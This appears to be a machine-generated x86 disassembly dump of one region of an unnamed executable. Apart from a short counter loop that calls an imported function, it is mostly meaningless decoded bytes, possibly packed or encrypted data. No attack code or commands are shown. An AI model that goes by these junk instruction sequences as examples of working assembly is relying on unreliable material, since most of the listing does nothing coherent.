  41601c:	lock fld DWORD PTR [eax+0x337128fb]
  416023:	jecxz  0x416015
  416025:	les    eax,FWORD PTR [eax-0x7d]
  416028:	repz das 
  41602a:	fcom   st(6)
  41602c:	sub    al,0xeb
  41602e:	aas    
  41602f:	(bad)  
  416030:	iret   
  416031:	outs   dx,DWORD PTR ds:[esi]
  416032:	jnp    0x415fcd
  416034:	xchg   edi,eax
  416035:	fidiv  DWORD PTR [ecx+ebx*2+0x4]
  416039:	inc    edx
  41603a:	(bad)  
  41603c:	and    DWORD PTR [eiz*4+0x32863164],eax
  416043:	arpl   WORD PTR [ecx+0x601e508c],ax
  416049:	or     BYTE PTR [esi-0x76dfc915],dl
  41604f:	cmp    al,0x39
  416051:	mov    ch,0x26
  416053:	mov    ebx,0x7bd67680
  416058:	sbb    al,BYTE PTR [ebp-0x13]
  41605b:	jmp    0x415fe1
  41605d:	push   eax
  41605e:	nop
  41605f:	iret   
  416060:	ins    DWORD PTR es:[edi],dx
  416061:	jne    0x416091
  416063:	hlt    
  416064:	push   ebp
  416065:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416066:	mov    dh,0xaf
  416068:	push   esi
  416069:	push   ss
  41606a:	pop    esi
  41606b:	(bad)  
  41606c:	jmp    0x9ed8a825
  416071:	or     BYTE PTR [eax],bh
  416073:	hlt    
  416074:	mov    ss,WORD PTR [edi]
  416076:	test   eax,0xd663c318
  41607b:	out    0x59,al
  41607d:	mov    ebx,0xc3dd4137
  416082:	inc    edi
  416083:	xor    DWORD PTR [edx],edx
  416085:	mov    dh,0x5e
  416087:	jno    0x416108
  416089:	pop    eax
  41608a:	adc    dl,dh
  41608c:	cdq    
  41608d:	jecxz  0x41609a
  41608f:	mov    BYTE PTR [esi+0x43],bh
  416092:	sub    ecx,eax
  416094:	push   ds
  416095:	xlat   BYTE PTR ds:[ebx]
  416096:	mov    dh,0xc6
  416098:	add    cl,BYTE PTR [esi+0x689f2dfa]
  41609e:	mov    eax,ds:0xeae373c9
  4160a3:	popa   
  4160a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160a5:	sub    cl,ch
  4160a7:	xor    DWORD PTR [ebp-0xd8fa07f],esp
  4160ad:	xchg   ecx,eax
  4160ae:	pop    esi
  4160af:	clc    
  4160b0:	xchg   BYTE PTR [eax+0x47e293c2],bl
  4160b6:	mov    edx,0xdbeb6ee0
  4160bb:	cmp    cl,ah
  4160bd:	pop    esi
  4160be:	dec    esi
  4160bf:	clc    
  4160c0:	in     al,dx
  4160c1:	jmp    0x41604a
  4160c3:	dec    edx
  4160c4:	repnz dec eax
  4160c6:	shl    BYTE PTR [ebx+0x10],0xb3
  4160ca:	and    ch,ch
  4160cc:	aas    
  4160cd:	outs   dx,BYTE PTR ss:[esi]
  4160cf:	push   edi
  4160d0:	cmp    ch,ch
  4160d2:	ins    BYTE PTR es:[edi],dx
  4160d3:	xchg   edx,eax
  4160d4:	shl    DWORD PTR [ecx],1
  4160d6:	dec    ecx
  4160d7:	pop    ss
  4160d8:	adc    eax,0x9eb9440b
  4160dd:	sbb    dh,dh
  4160df:	jmp    0xe493edb7
  4160e4:	ret    0x4236
  4160e7:	daa    
  4160e8:	inc    esp
  4160e9:	cli    
  4160ea:	or     cl,BYTE PTR [ebx]
  4160ec:	loope  0x416080
  4160ee:	fmul   st(3),st
  4160f0:	and    BYTE PTR [edi+esi*1-0x6],0x6e
  4160f5:	clc    
  4160f6:	inc    ecx
  4160f7:	stos   DWORD PTR es:[edi],eax
  4160f8:	add    cl,BYTE PTR [ecx+0x2c]
  4160fb:	lahf   
  4160fc:	sahf   
  4160fd:	sti    
  4160fe:	sbb    DWORD PTR [ebx+0x6d],esi
  416101:	pop    edx
  416102:	je     0x41610a
  416104:	xor    BYTE PTR [ebp-0x703c9878],dh
  41610a:	dec    ebx
  41610b:	popf   
  41610c:	stc    
  41610d:	dec    eax
  41610e:	out    dx,eax
  41610f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416110:	cmp    eax,0x2f6db620
  416115:	sbb    eax,0x183b614c
  41611a:	mov    eax,0x6b8715f
  41611f:	rcr    BYTE PTR [edx-0x6f34ee94],cl
  416125:	adc    eax,0x11a5a2a9
  41612a:	ss int3 
  41612c:	std    
  41612d:	mov    edx,0xf053e135
  416132:	out    dx,eax
  416133:	inc    edx
  416134:	xchg   esi,eax
  416135:	jmp    0xfa12f681
  41613a:	pop    eax
  41613b:	popf   
  41613c:	pop    ebp
  41613d:	jno    0x41610a
  41613f:	es sub eax,0xfab20ff8
  416145:	sbb    esp,DWORD PTR [ebp+0x45]
  416148:	pop    ebx
  416149:	outs   dx,DWORD PTR ds:[esi]
  41614a:	mov    ecx,0x30d3ee3d
  41614f:	sar    BYTE PTR [ecx+eiz*4+0x3f5c9190],0xf9
  416157:	adc    bh,BYTE PTR [edx]
  416159:	sub    al,0x59
  41615b:	jle    0x416189
  41615d:	(bad)  
  41615e:	jmp    0x7263:0x25cd811d
  416165:	add    al,dh
  416167:	cmp    BYTE PTR [ebx],bl
  416169:	mov    ecx,ecx
  41616b:	and    ecx,DWORD PTR [ecx]
  41616d:	popf   
  41616e:	in     eax,0x3a
  416170:	je     0x416134
  416172:	mov    dh,0x88
  416174:	xlat   BYTE PTR ds:[ebx]
  416175:	nop
  416176:	push   ds
  416177:	push   eax
  416178:	repz fdivr st(3),st
  41617b:	push   0xffffffc5
  41617d:	sahf   
  41617e:	pop    eax
  41617f:	push   esp
  416180:	mov    edx,0xf8d506b8
  416185:	js     0x41616d
  416187:	outs   dx,DWORD PTR ds:[esi]
  416188:	jae    0x416147
  41618a:	leave  
  41618b:	jecxz  0x416197
  41618d:	(bad)  
  41618e:	into   
  41618f:	aad    0xd2
  416191:	aas    
  416192:	mov    dh,0x74
  416194:	cmp    al,dh
  416196:	in     al,0x91
  416198:	test   al,0xe9
  41619a:	mov    al,ds:0xe50d4390
  41619f:	and    DWORD PTR [ebp+0xa50f86b],esi
  4161a5:	pop    es
  4161a6:	test   eax,0xa22cfab1
  4161ab:	pop    bp
  4161ad:	not    BYTE PTR [ebp-0x63320346]
  4161b3:	inc    edi
  4161b4:	in     eax,dx
  4161b5:	mov    esi,0xf1f6db23
  4161ba:	clc    
  4161bb:	addr16 adc dh,bl
  4161be:	jg     0x41617f
  4161c0:	sub    DWORD PTR cs:[edi+0x7e4d0133],ebp
  4161c7:	mov    dl,0x76
  4161c9:	and    eax,DWORD PTR [esi]
  4161cb:	pop    es
  4161cc:	mov    eax,ds:0x55bd944e
  4161d1:	icebp  
  4161d2:	pop    ds
  4161d3:	xor    BYTE PTR [ebp-0x7bc35d5f],0xd1
  4161da:	in     eax,dx
  4161db:	cs retf 0x12e5
  4161df:	sub    ebx,DWORD PTR [edi]
  4161e1:	sub    al,dh
  4161e3:	or     al,0x35
  4161e5:	stc    
  4161e6:	inc    esp
  4161e7:	stc    
  4161e8:	or     ch,BYTE PTR [eax+0x53]
  4161eb:	imul   ebx,DWORD PTR [edi],0xbf8e6dbf
  4161f1:	mov    eax,DWORD PTR [ebp-0x4]
  4161f4:	mov    DWORD PTR ds:0x42a88d,0x1c
  4161fe:	cmp    DWORD PTR ds:0x42a88d,0x0
  416205:	je     0x41625b
  41620b:	cmp    DWORD PTR ds:0x42a88d,0xe
  416212:	jne    0x41622f
  416218:	push   0x7e45
  41621d:	push   DWORD PTR [ebp-0x1c]
  416220:	push   DWORD PTR [ebp-0xc]
  416223:	push   DWORD PTR [ebp-0x20]
  416226:	push   DWORD PTR [ebp-0x14]
  416229:	call   DWORD PTR ds:0x41d1f4
  41622f:	cmp    DWORD PTR ds:0x42a88d,0xf
  416236:	jne    0x416249
  41623c:	mov    edx,DWORD PTR ds:0x42a88d
  416242:	dec    edx
  416243:	mov    DWORD PTR ds:0x42a88d,edx
  416249:	mov    edx,DWORD PTR ds:0x42a88d
  41624f:	dec    edx
  416250:	mov    DWORD PTR ds:0x42a88d,edx
  416256:	jmp    0x4161fe
  41625b:	xor    eax,edi
  41625d:	add    eax,esi
  41625f:	add    DWORD PTR ds:0x42a769,edi
  416265:	push   eax
  416266:	push   DWORD PTR [ebp-0x8]
  416269:	push   DWORD PTR [ebp-0x4]
  41626c:	mov    edx,DWORD PTR ds:0x41eae6
  416272:	add    DWORD PTR ds:0x42a841,0x2531
  41627c:	jmp    0x416534
  416281:	ret    0x3fc0
  416284:	leave  
  416285:	leave  
  416286:	leave  
  416287:	retf   0x22c7
  41628a:	add    esp,DWORD PTR [ebx-0x3329e046]
  416290:	and    eax,0x787f18bc
  416295:	xchg   ebp,eax
  416296:	jle    0x416310
  416298:	js     0x41622f
  41629a:	pushf  
  41629b:	and    eax,0x5dbf7f6a
  4162a0:	fldenv [edi*1+0x47478e8c]
  4162a7:	out    dx,al
  4162a8:	xchg   edi,eax
  4162a9:	int    0xd2
  4162ab:	push   0x8f546a21
  4162b0:	sbb    dl,BYTE PTR [esi+0x6f1e222]
  4162b6:	retf   
  4162b7:	test   al,0xbb
  4162b9:	sar    dl,0x89
  4162bc:	lock xor eax,0x45260af0
  4162c2:	jle    0xa5cc5aa3
  4162c8:	ja     0x416317
  4162ca:	faddp  st(6),st
  4162cc:	mov    DWORD PTR ds:0x760fb791,eax
  4162d2:	xchg   esi,eax
  4162d3:	js     0x4162d4
  4162d5:	outs   dx,DWORD PTR ds:[esi]
  4162d6:	inc    esp
  4162d7:	sub    DWORD PTR ds:0x88001c6a,0xeaf8affb
  4162e1:	(bad)  
  4162e2:	dec    esp
  4162e3:	add    DWORD PTR [esi+0x555d8676],eax
  4162e9:	xchg   edx,eax
  4162ea:	ss mov ds,ebx
  4162ed:	clc    
  4162ee:	inc    eax
  4162ef:	cmp    bl,BYTE PTR [edi+0x14cf4d64]
  4162f5:	or     BYTE PTR [edx+0xb],al
  4162f8:	fstp   QWORD PTR [edi-0x68b7562b]
  4162fe:	xchg   edi,eax
  4162ff:	add    DWORD PTR [ebx-0x6cb57e62],0x68a4cc67
  416309:	add    eax,0x1b0e518d
  41630e:	push   es
  41630f:	mov    esi,0xec97ad8c
  416314:	cld    
  416315:	imul   edx,edi,0xf7667765
  41631b:	repnz mov ds:0x37a07b22,al
  416321:	jl     0x416317
  416323:	add    BYTE PTR [esi],0x2f
  416326:	sub    bl,BYTE PTR ds:[esi-0x2295403d]
  41632d:	inc    ecx
  41632e:	cwde   
  41632f:	retf   
  416330:	(bad)  
  416331:	mov    ch,0x4c
  416333:	cli    
  416334:	dec    ebp
  416335:	jge    0x416310
  416337:	mov    ebp,0x50baf02f
  41633c:	adc    bh,BYTE PTR [eax+ecx*8+0x3]
  416340:	loope  0x416394
  416342:	(bad)  
  416343:	enter  0xada3,0x3
  416347:	inc    esi
  416348:	popa   
  416349:	mov    cl,0xbd
  41634b:	(bad)
  41634e:	ds stc 
  416350:	add    DWORD PTR [ebp+0x5becc662],eax
  416356:	sub    bh,0xa0
  416359:	add    al,0xc4
  41635b:	(bad)  
  41635c:	pop    ebx
  41635d:	or     al,0xf9
  41635f:	and    al,0x3c
  416361:	xchg   ebx,eax
  416362:	sbb    BYTE PTR [eax-0x63],bh
  416365:	cli    
  416366:	xchg   edi,eax
  416367:	mov    cl,0x38
  416369:	cdq    
  41636a:	xlat   BYTE PTR ds:[ebx]
  41636b:	pop    esi
  41636c:	pop    ecx
  41636d:	and    ebx,eax
  41636f:	and    al,0x3d
  416371:	push   cs
  416372:	rcl    DWORD PTR [ebx+esi*4-0x28],1
  416376:	or     al,0xe6
  416378:	in     al,0xd7
  41637a:	push   ss
  41637b:	push   eax
  41637c:	or     BYTE PTR [esi],dl
  41637e:	aaa    
  41637f:	xor    esp,DWORD PTR [edx-0x2fed54f0]
  416385:	out    dx,eax
  416386:	xchg   BYTE PTR [ecx],ch
  416388:	mov    esp,0xccb8581e
  41638d:	push   ds
  41638e:	dec    esp
  41638f:	fdivr  QWORD PTR [ecx+0x367923cf]
  416395:	sbb    edx,edi
  416397:	ror    ebx,0xe
  41639a:	jecxz  0x416361
  41639c:	outs   dx,BYTE PTR ds:[esi]
  41639d:	aas    
  41639e:	sub    ah,BYTE PTR [esp+ebp*2+0x3b]
  4163a2:	jbe    0x416414
  4163a4:	pushf  
  4163a5:	mov    bl,0x25
  4163a7:	and    bh,cl
  4163a9:	retf   
  4163aa:	cmp    eax,0x8e38e337
  4163af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163b0:	cmp    al,0x2e
  4163b2:	pop    ecx
  4163b3:	mov    ah,0xd6
  4163b5:	sahf   
  4163b6:	sti    
  4163b7:	arpl   WORD PTR [ebx],di
  4163b9:	popf   
  4163ba:	jp     0x41638f
  4163bc:	mov    ch,0x14
  4163be:	test   DWORD PTR [edi+ebp*1+0x51],eax
  4163c2:	(bad)  [edi]
  4163c4:	pop    esi
  4163c5:	daa    
  4163c6:	sub    eax,0xc1eacdfa
  4163cb:	and    al,0x88
  4163cd:	or     DWORD PTR [esi+0x5e],0xc70a995f
  4163d4:	mov    esi,0xee8c6127
  4163d9:	mov    WORD PTR [esi],ds
  4163db:	jp     0x41643a
  4163dd:	xlat   BYTE PTR ds:[ebx]
  4163de:	inc    ebx
  4163df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163e0:	fiadd  WORD PTR [ebx-0x6da49716]
  4163e6:	dec    edi
  4163e7:	addr16 pop esp
  4163e9:	sub    DWORD PTR [eax],edx
  4163eb:	fadd   DWORD PTR [edx]
  4163ed:	sub    DWORD PTR [esi+0x0],0xffffffe8
  4163f1:	test   WORD PTR [edx-0x62],0xb471
  4163f7:	popf   
  4163f8:	mov    al,ds:0xf22f1618
  4163fd:	test   DWORD PTR [ebx+0x675be300],ebx
  416403:	(bad)  
  416404:	or     DWORD PTR [eax-0x67],eax
  416407:	push   ecx
  416408:	mov    eax,ds:0x513d50b0
  41640d:	mov    esp,0x8b168fc1
  416412:	sub    BYTE PTR ds:0x60709b4d,dl
  416418:	test   BYTE PTR [edx+ebp*1-0x47dace51],0xec
  416420:	mov    al,0x23
  416422:	cmp    BYTE PTR [esi+esi*4+0x7942f07f],0xfc
  41642a:	inc    ecx
  41642b:	lods   eax,DWORD PTR ds:[esi]
  41642c:	mov    dl,0x2c
  41642e:	ret    
  41642f:	clc    
  416430:	mov    dl,0xa7
  416432:	mov    dh,0xdc
  416434:	ja     0x4163d6
  416436:	in     eax,dx
  416437:	mov    ecx,0x2acd74b
  41643c:	imul   ebx,DWORD PTR [edi+0x77c25242],0x3f
  416443:	(bad)
  416446:	test   al,0x5f
  416448:	adc    esi,DWORD PTR [ebx+0x50c687c9]
  41644e:	lods   al,BYTE PTR ds:[esi]
  41644f:	dec    ecx
  416450:	not    DWORD PTR [edx+0x1942a70c]
  416456:	call   0x76b7dbd1
  41645b:	inc    eax
  41645d:	jnp    0x416492
  41645f:	or     eax,0x58ea3031
  416464:	and    BYTE PTR [ebp+0x4da8c186],bl
  41646a:	jo     0x4164c0
  41646c:	mul    DWORD PTR [ecx-0x6b]
  41646f:	ja     0x416450
  416471:	sub    eax,0x9fe3690f
  416476:	dec    ebp
  416477:	ins    DWORD PTR es:[edi],dx
  416478:	jmp    0x3493db64
  41647d:	adc    eax,edx
  41647f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416480:	jae    0x4164af
  416482:	mul    BYTE PTR [ebx-0x24fe6b3b]
  416488:	stos   DWORD PTR es:[edi],eax
  416489:	dec    esi
  41648a:	jg     0x4164f7
  41648c:	out    dx,eax
  41648d:	jnp    0x4164a8
  41648f:	mov    dl,0x4
  416491:	inc    edx
  416492:	(bad)  
  416493:	cmp    BYTE PTR [ebx+0x16],al
  416496:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416497:	aad    0x7a
  416499:	mov    eax,ds:0x4dcac6a7
  41649e:	(bad)  
  41649f:	or     edx,edx
  4164a1:	add    DWORD PTR [edi-0x10],ebx
  4164a4:	cmp    ebp,esi
  4164a6:	iret   
  4164a7:	adc    DWORD PTR gs:[ebp+0x7],esi
  4164ab:	jmp    0x6392:0x226fb632
  4164b2:	sbb    BYTE PTR [ebx],ch
  4164b4:	test   DWORD PTR [ebp-0x68],0x197db644
  4164bb:	loop   0x4164cd
  4164bd:	jle    0x4164fc
  4164bf:	mov    cl,0xc4
  4164c1:	daa    
  4164c2:	test   al,0x59
  4164c4:	lea    eax,[edx]
  4164c6:	jmp    0x82a2:0xafda0a9c
  4164cd:	mov    cl,0x1
  4164cf:	cmp    ah,dh
  4164d1:	pushf  
  4164d2:	adc    al,0x4c
  4164d4:	dec    ebx
  4164d5:	scas   al,BYTE PTR es:[edi]
  4164d6:	shl    BYTE PTR [eax],1
  4164d8:	dec    esp
  4164d9:	(bad)
  4164dc:	cdq    
  4164dd:	fsubr  st(7),st
  4164df:	push   ebp
  4164e0:	jmp    0x97032dfc
  4164e5:	gs push ecx
  4164e7:	rcl    ah,1
  4164e9:	pop    edi
  4164ea:	or     BYTE PTR [edi-0x59],ah
  4164ed:	cmp    dl,BYTE PTR [esi+esi*2-0x9ba5173]
  4164f4:	push   ss
  4164f5:	call   0xe1c:0xad7a17bf
  4164fc:	scas   al,BYTE PTR es:[edi]
  4164fd:	pmaxsw mm5,QWORD PTR [esi]
  416500:	shl    al,0x9a
  416503:	adc    ecx,eax
  416505:	sbb    al,dh
  416507:	jno    0x4164f7
  416509:	fcmovbe st,st(4)
  41650b:	aas    
  41650c:	push   es
  41650d:	sub    DWORD PTR [ecx+ecx*2],edi
  416510:	inc    ebp
  416511:	pop    ss
  416512:	jae    0x4164b0
  416514:	pop    ss
  416515:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416516:	dec    edi
  416517:	popf   
  416518:	cmp    DWORD PTR [ecx+0x58],0xec5ce559
  41651f:	or     al,0x23
  416521:	mov    ebx,0x5a839854
  416526:	(bad)  
  416527:	xchg   ebp,eax
  416528:	lahf   
  416529:	fnstsw WORD PTR [bp+si]
  41652c:	pop    esi
  41652d:	sub    eax,0x26fdce01
  416532:	jmp    0x18744d40
  416537:	add    BYTE PTR [eax],al
  416539:	mov    ecx,DWORD PTR ds:0x41eae6
  41653f:	mov    ecx,DWORD PTR [ecx+0x1cc]
  416545:	jmp    0x4167fd
  41654a:	ret    
  41654b:	int3   
  41654c:	(bad)  
  41654d:	int3   
  41654e:	aad    0xda
  416550:	leave  
  416551:	rol    DWORD PTR [ebp-0x591c839a],cl
  416557:	call   0x1e1b14b5
  41655c:	jg     0x4165d6
  41655e:	xchg   ebp,eax
  41655f:	jle    0x4165d9
  416561:	js     0x416532
  416563:	leave  
  416564:	cld    
  416565:	lods   al,BYTE PTR ds:[esi]
  416566:	mov    cl,0x4a
  416568:	clc    
  416569:	cmp    eax,0xdda3ed03
  41656e:	ja     0x41651a
  416570:	repz mov WORD PTR ss:[ecx-0x5a],ss
  416575:	cwde   
  416576:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416577:	pop    edx
  416578:	mul    BYTE PTR [ecx+0x1ba696f7]
  41657e:	imul   edi,DWORD PTR [ecx+ebp*1+0x72ce41cc],0x3
  416586:	cdq    
  416587:	retf   
  416588:	into   
  416589:	jns    0x41658d
  41658b:	outs   dx,BYTE PTR ds:[esi]
  41658c:	inc    ebp
  41658d:	xor    eax,0x4356544b
  416592:	out    0x1d,al
  416594:	inc    eax
  416595:	inc    ebx
  416596:	sub    eax,0x6c78edfe
  41659b:	lahf   
  41659c:	inc    bh
  41659e:	scas   eax,DWORD PTR es:[edi]
  41659f:	inc    ebx
  4165a0:	loope  0x4165c1
  4165a2:	mov    eax,ds:0x327383c1
  4165a7:	es ss adc esp,ebx
  4165ab:	shl    DWORD PTR [edi-0x1d],1
  4165ae:	adc    BYTE PTR [ebx+0x2a],ch
  4165b1:	and    edi,DWORD PTR [esi]
  4165b3:	loop   0x41657c
  4165b5:	and    al,0xdf
  4165b7:	out    dx,al
  4165b8:	xor    al,0xd9
  4165ba:	sbb    dh,cl
  4165bc:	mov    ds:0x6e7d64bb,al
  4165c1:	inc    ecx
  4165c2:	enter  0x1b45,0xd7
  4165c6:	pushf  
  4165c7:	stc    
  4165c8:	inc    edx
  4165c9:	sbb    cl,BYTE PTR [edx-0xa]
  4165cc:	cs stos BYTE PTR es:[edi],al
  4165ce:	cwde   
  4165cf:	xor    ch,BYTE PTR [esi+edx*2-0x31]
  4165d3:	in     al,dx
  4165d4:	sub    eax,0x5299b8f5
  4165d9:	mov    cl,0x59
  4165db:	test   DWORD PTR ss:0x75723e19,ebx
  4165e2:	pop    eax
  4165e3:	ja     0x41663f
  4165e5:	lds    edx,FWORD PTR [ebx-0x32]
  4165e8:	mov    edx,0x732b9d47
  4165ed:	(bad)  
  4165ee:	jnp    0x416633
  4165f0:	xor    BYTE PTR [ecx],dl
  4165f2:	inc    esi
  4165f3:	jge    0x416621
  4165f5:	lahf   
  4165f6:	push   0xd8ef681
  4165fb:	out    0x94,al
  4165fd:	pop    ebx
  4165fe:	leave  
  4165ff:	add    eax,0x71513e01
  416604:	inc    esp
  416605:	push   0x7726c42
  41660a:	mov    bl,bh
  41660c:	iret   
  41660d:	popf   
  41660e:	out    dx,al
  41660f:	or     esp,DWORD PTR [ecx+0x62]
  416612:	imul   ecx,DWORD PTR ds:0xd3e152d4,0xffffffef
  416619:	hlt    
  41661a:	dec    edi
  41661b:	cmp    ecx,DWORD PTR [ecx+0x73]
  41661e:	mov    esp,0x392d62db
  416623:	push   eax
  416624:	pusha  
  416625:	sub    BYTE PTR [ebp+0x39],0x53
  416629:	mov    eax,0x4de74dcf
  41662e:	ss cmp eax,0x2a4ef0e5
  416634:	mov    edx,0x13714d83
  416639:	std    
  41663a:	nop
  41663b:	adc    eax,0xa8ec33e0
  416640:	push   esp
  416641:	mov    ch,0x8b
  416643:	lods   eax,DWORD PTR ds:[esi]
  416644:	jmp    0xdfc2:0xb17f3423
  41664b:	test   edx,0x6300edc7
  416651:	pop    ds
  416652:	xor    al,0xa4
  416654:	xchg   esp,eax
  416655:	add    edx,edi
  416657:	rcr    DWORD PTR [ecx],0x19
  41665a:	mov    bh,0xa2
  41665c:	test   BYTE PTR [esi+eiz*8],bh
  41665f:	sbb    BYTE PTR [ebx+0x52],dl
  416662:	adc    al,0x2c
  416664:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416665:	or     bl,BYTE PTR [eax]
  416667:	div    DWORD PTR [eax]
  416669:	add    eax,0xcef36eaa
  41666e:	imul   edx,DWORD PTR [eax+0x624ababc],0x6d6f060b
  416678:	push   eax
  416679:	icebp  
  41667a:	sub    al,0xcb
  41667c:	repz jp 0x4166ed
  41667f:	inc    ecx
  416680:	jns    0x416699
  416682:	out    dx,eax
  416683:	std    
  416684:	loope  0x41667c
  416686:	(bad)  
  416687:	pusha  
  416688:	iret   
  416689:	hlt    
  41668a:	aas    
  41668b:	hlt    
  41668c:	jecxz  0x4166e0
  41668e:	sub    al,0x98
  416690:	(bad)
  416694:	test   al,0x71
  416696:	cmp    BYTE PTR es:[ebx],ch
  416699:	aad    0xa7
  41669b:	xchg   esi,eax
  41669c:	shr    DWORD PTR [edx-0x39],cl
  41669f:	repnz pop ecx
  4166a1:	std    
  4166a2:	retf   
  4166a3:	out    0xde,al
  4166a5:	dec    ecx
  4166a6:	hlt    
  4166a7:	lock gs pop ebp
  4166aa:	mov    edx,DWORD PTR [edi-0x5a]
  4166ad:	cli    
  4166ae:	not    DWORD PTR [esi+0x69]
  4166b1:	pop    DWORD PTR [eax]
  4166b3:	sti    
  4166b4:	cmp    DWORD PTR [esi+0x5c7f8edb],ecx
  4166ba:	retf   
  4166bb:	fcom   DWORD PTR [eax+0x71]
  4166be:	or     edx,ebp
  4166c0:	cdq    
  4166c1:	pop    ebx
  4166c2:	mov    ds:0x6adc87a9,al
  4166c7:	hlt    
  4166c8:	sub    eax,0x30a2a30b
  4166cd:	js     0x4166e1
  4166cf:	shl    ah,1
  4166d1:	jb     0x416698
  4166d3:	ins    BYTE PTR es:[edi],dx
  4166d4:	jmp    0x9927:0x48046177
  4166db:	test   al,0x54
  4166dd:	in     al,dx
  4166de:	jmp    0xc52fa7a2
  4166e3:	push   cs
  4166e4:	xchg   ebp,eax
  4166e5:	jne    0x4166fb
  4166e7:	mov    ebx,DWORD PTR [esi+0x30cebbe3]
  4166ed:	mov    dh,0x6a
  4166ef:	cmp    DWORD PTR [edx+ecx*4+0x7060ba13],ebp
  4166f6:	into   
  4166f7:	add    eax,0xa7b8e08e
  4166fc:	mov    WORD PTR [edx-0x6c],fs
  4166ff:	cmp    DWORD PTR ds:0x4b4d9ec4,0x5
  416706:	(bad)  
  416707:	xchg   esi,eax
  416708:	push   cs
  416709:	jg     0x416786
  41670b:	fidivr WORD PTR [ecx]
  41670d:	shr    eax,cl
  41670f:	pop    edi
  416710:	mov    al,0x97
  416712:	mov    dh,0xa5
  416714:	es sbb bl,ch
  416717:	int3   
  416718:	test   BYTE PTR [ebx],bl
  41671a:	cwde   
  41671b:	xchg   ebp,eax
  41671c:	inc    esp
  41671d:	mov    DWORD PTR ds:0xde2be26a,eax
  416723:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416724:	call   0x11f5:0x5fdaa8d8
  41672b:	lahf   
  41672c:	loopne 0x416777
  41672e:	sub    eax,0x17c99a8b
  416733:	sub    al,BYTE PTR [ebx+0x531fb9db]
  416739:	(bad)  
  41673a:	pop    ebp
  41673b:	imul   esp,DWORD PTR [edx],0x0
  41673e:	push   ss
  41673f:	xor    eax,0xce9045cf
  416744:	cld    
  416745:	lds    ebp,FWORD PTR [edx]
  416747:	addr16 push 0x299bbf30
  41674d:	jmp    0xfce7:0x4873bf55
  416754:	sbb    ecx,ebp
  416756:	push   edi
  416757:	aam    0xa0
  416759:	popf   
  41675a:	cmp    esp,DWORD PTR [ecx+0x35]
  41675d:	jmp    0x416736
  41675f:	inc    ebx
  416760:	js     0x416724
  416762:	jle    0x41674e
  416764:	fnstsw WORD PTR [ecx]
  416766:	cld    
  416767:	mov    bl,0x70
  416769:	jle    0x4167d5
  41676b:	sub    eax,0xd216b19f
  416770:	hlt    
  416771:	dec    edi
  416772:	jge    0x416749
  416774:	mov    dl,0xa4
  416776:	push   ds
  416777:	xchg   DWORD PTR [edx],esp
  416779:	clc    
  41677a:	imul   ecx,DWORD PTR [esi-0x50184f98],0x48
  416781:	pop    ds
  416782:	push   ebx
  416783:	test   DWORD PTR [esi+0xd2a382b],edx
  416789:	call   0xb348471b
  41678e:	mov    ecx,0x53432e44
  416793:	(bad)  
  416794:	retf   0xf2e1
  416797:	(bad)  
  416799:	cli    
  41679a:	call   0xfd0c:0x42ba9361
  4167a1:	mov    dh,0x93
  4167a3:	popf   
  4167a4:	cld    
  4167a5:	popf   
  4167a6:	inc    ecx
  4167a7:	aas    
  4167a8:	pop    ebp
  4167a9:	sbb    ebx,DWORD PTR [edx-0x43]
  4167ac:	jo     0x416733
  4167ae:	and    BYTE PTR [eax-0x6ac778a],dl
  4167b4:	repz ret 0x8128
  4167b8:	and    BYTE PTR [ebp-0x6f],bh
  4167bb:	ret    0x48fb
  4167be:	pop    esp
  4167bf:	in     al,0x1b
  4167c1:	call   0x6e19665
  4167c6:	adc    al,0x3d
  4167c8:	pop    ss
  4167c9:	fbld   TBYTE PTR [edx+0x727626e8]
  4167cf:	jae    0x416775
  4167d1:	das    
  4167d2:	xchg   ebp,eax
  4167d3:	add    ebx,0x6a
  4167d6:	gs push edi
  4167d8:	pusha  
  4167d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167da:	mov    eax,ds:0x8961bfcc
  4167df:	mov    ds:0x34ba32c7,eax
  4167e4:	fimul  WORD PTR [edi+0x45]
  4167e7:	shl    BYTE PTR [edx+0x174a28c4],0xc1
  4167ee:	out    0xe7,al
  4167f0:	rcl    BYTE PTR [ecx],1
  4167f2:	test   eax,0x3ac6a9e5
  4167f7:	(bad)
  4167fb:	int3   
  4167fc:	into   
  4167fd:	mov    DWORD PTR [ecx],eax
  4167ff:	mov    eax,DWORD PTR [ebp-0x8]
  416802:	jmp    0x41731f
  416807:	jmp    0x416abf
  41680c:	ds rcl esi,1
  41680f:	int3   
  416810:	(bad)  
  416812:	retf   0x7ed1
  416815:	xchg   ebx,eax
  416816:	aam    0x3d
  416818:	fisub  DWORD PTR [esi-0x2]
  41681b:	xor    BYTE PTR [esi+0x23],0x7f
  41681f:	js     0x4167b6
  416821:	jle    0x41689b
  416823:	js     0x416864
  416825:	sahf   
  416826:	mov    gs,WORD PTR [eax+0x2e]
  416829:	and    BYTE PTR [ebp-0x243757e],bl
  41682f:	or     DWORD PTR [ebx],ecx
  416831:	mov    edx,0xab54c4ad
  416836:	mov    esp,0x8446623b
  41683b:	push   ss
  41683c:	xchg   edx,eax
  41683d:	daa    
  41683e:	stos   DWORD PTR es:[edi],eax
  41683f:	push   esp
  416840:	pop    es
  416841:	fst    DWORD PTR [edx-0x77881736]
  416847:	adc    eax,0xa8769414
  41684c:	shl    BYTE PTR [ebx+0x2c],0x73
  416850:	std    
  416851:	adc    al,0x1a
  416853:	push   DWORD PTR [ebp+0x1d588db0]
  416859:	mov    DWORD PTR [edx-0x16],ebp
  41685c:	dec    ebp
  41685d:	xor    esp,DWORD PTR [edx+0x66]
  416860:	stos   BYTE PTR es:[edi],al
  416861:	dec    ebp
  416862:	arpl   WORD PTR [edx],bx
  416864:	aas    
  416865:	int    0x2b
  416867:	sub    ecx,DWORD PTR [ebp-0x1e2c240]
  41686d:	shl    DWORD PTR [ebp+eiz*2-0x1ec1df54],0x53
  416875:	xchg   ebp,eax
  416876:	inc    esi
